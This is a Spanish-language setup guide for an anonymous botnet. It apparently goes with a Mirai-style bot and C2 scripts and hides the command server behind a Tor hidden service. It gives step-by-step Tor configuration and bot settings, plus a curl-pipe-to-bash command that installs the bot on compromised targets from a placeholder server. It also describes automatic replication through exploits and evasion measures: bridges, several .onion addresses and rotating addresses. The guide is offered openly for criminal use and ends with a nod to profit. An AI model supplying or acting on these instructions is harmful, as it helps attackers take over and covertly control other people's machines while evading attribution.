# ===================================================================
#  GUÍA: BOTNET ANÓNIMA CON TOR HIDDEN SERVICE
# ===================================================================

## 🧅 PRIVACIDAD GARANTIZADA + GRATIS

Esta configuración te da:
- ✅ Anonimato total (tu IP nunca se expone)
- ✅ Sin costo (100% gratis)
- ✅ Sin necesidad de VPS o port forwarding
- ✅ Tráfico encriptado end-to-end


## PASO 1: Instalar Tor Hidden Service

### Windows (tu PC):
```batch
# Ejecutar:
setup_tor_c2.bat

# Espera 10 segundos y verás algo como:
# abc123def456ghi789jkl.onion
```

### Linux (si usas VPS):
```bash
sudo apt install tor -y
sudo mkdir -p /var/lib/tor/hidden_service
sudo chmod 700 /var/lib/tor/hidden_service

# Editar /etc/tor/torrc:
sudo nano /etc/tor/torrc

# Agregar estas líneas:
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 8443 127.0.0.1:8443

# Reiniciar Tor:
sudo systemctl restart tor

# Ver tu dirección .onion:
sudo cat /var/lib/tor/hidden_service/hostname
```


## PASO 2: Configurar el Bot

Edita `bot_soldier.py` líneas 37-42:

```python
# Comentar modo normal:
# C2_IP = '192.168.56.1'

# Descomentar modo TOR:
C2_IP = 'TU_DIRECCION_AQUI.onion'  # ⬅️ Pegar tu .onion aquí
C2_PORT = 8443
USE_TOR = True
TOR_PROXY = ('127.0.0.1', 9050)
```


## PASO 3: Iniciar C2 (en tu PC)

```batch
# Terminal 1 - Iniciar Tor:
cd c:\Users\Rubir\Downloads\mirai
setup_tor_c2.bat

# Terminal 2 - Iniciar C2:
python c2_commander.py
```


## PASO 4: Distribuir el Bot

### Opción A: Compilar con Tor embebido
```batch
# El bot ya tiene soporte Tor integrado
python bot_soldier.py
```

### Opción B: Script de instalación para sistemas comprometidos
```bash
# En el objetivo (necesita Tor instalado):
curl -s https://tu_servidor.com/install_bot_tor.sh | bash

# O manualmente:
apt install tor torsocks python3-pip -y
pip3 install paramiko cryptography PySocks
torsocks python3 bot_soldier.py
```


## PASO 5: Replicación Automática

Los bots explotados instalarán:
1. Tor/torsocks
2. Python + dependencias
3. Se conectarán a tu .onion

```
[C2] exploit 1 1
[Bot] Instalando Tor en objetivo...
[Bot] Conectando vía .onion...
[C2] Nuevo bot conectado: victim-04
```


## VENTAJAS vs VPS:

| Característica | VPS | Tor Hidden Service |
|---------------|-----|-------------------|
| Costo | $4-10/mes | Gratis |
| Anonimato | IP expuesta | 100% anónimo |
| Privacidad | Logs del proveedor | Sin logs |
| Velocidad | Rápido | Un poco más lento |
| Setup | Complejo | 5 minutos |


## SEGURIDAD ADICIONAL:

### 1. Usar Bridges (si Tor está bloqueado):
```
# En torrc agregar:
UseBridges 1
Bridge obfs4 XXX.XXX.XXX.XXX:XXXX ...
```

### 2. Múltiples .onion (redundancia):
```python
C2_SERVERS = [
    'primera.onion',
    'segunda.onion',
    'tercera.onion'
]
# El bot intentará conectarse a todas
```

### 3. Cambiar .onion regularmente:
```bash
# Generar nueva dirección:
sudo rm -rf /var/lib/tor/hidden_service
sudo systemctl restart tor
sudo cat /var/lib/tor/hidden_service/hostname
```


## TROUBLESHOOTING:

**Bot no conecta:**
```bash
# Verificar Tor esté corriendo:
ps aux | grep tor
netstat -tulpn | grep 9050

# Probar conexión manualmente:
torsocks curl http://check.torproject.org
```

**C2 no recibe conexiones:**
```bash
# Verificar hidden service activo:
cat tor/hidden_service/hostname

# Verificar C2 escuchando:
netstat -an | findstr 8443
```

**Tor muy lento:**
```
# Usar entry guards más rápidos:
# En torrc:
EntryNodes {US},{CA},{GB}
ExitNodes {US},{CA},{GB}
```


## NOTAS IMPORTANTES:

⚠️ La dirección .onion solo es accesible desde Tor
⚠️ Los bots necesitan tener Tor instalado o usar torsocks
⚠️ Primera conexión puede tardar 30-60 segundos (estableciendo circuito)
⚠️ Mantén tu .onion privada - es tu identificador único


## PRÓXIMOS PASOS:

1. Setup inicial con localhost para probar
2. Una vez funcione, cambiar a .onion
3. Distribuir bot con Tor embebido
4. Profit con anonimato total 🎭

